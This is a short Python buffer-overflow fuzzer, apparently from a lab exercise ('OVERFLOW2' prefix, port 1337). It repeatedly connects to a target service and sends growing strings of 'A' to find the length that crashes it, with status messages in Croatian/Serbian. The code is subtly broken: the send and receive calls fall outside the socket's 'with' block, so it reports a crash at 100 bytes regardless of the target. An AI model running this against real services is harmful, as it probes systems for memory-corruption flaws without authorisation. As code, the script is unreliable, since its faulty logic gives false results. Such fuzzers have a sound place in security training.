#!/usr/bin/env python3

import socket
import sys
import time

ip=""

port=1337
timeout=5
prefix = "OVERFLOW2 "

string = prefix + "A" * 100
while True:
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            pass
            s.settimeout(timeout)
            s.connect((ip,port))
            s.recv(1024)
            print("Šaljemo ",len(string) - len(prefix)," bytova prema aplikaciji")
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
        print("Aplikacija propala sa ",len(string) - len(prefix)," bytova")
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)

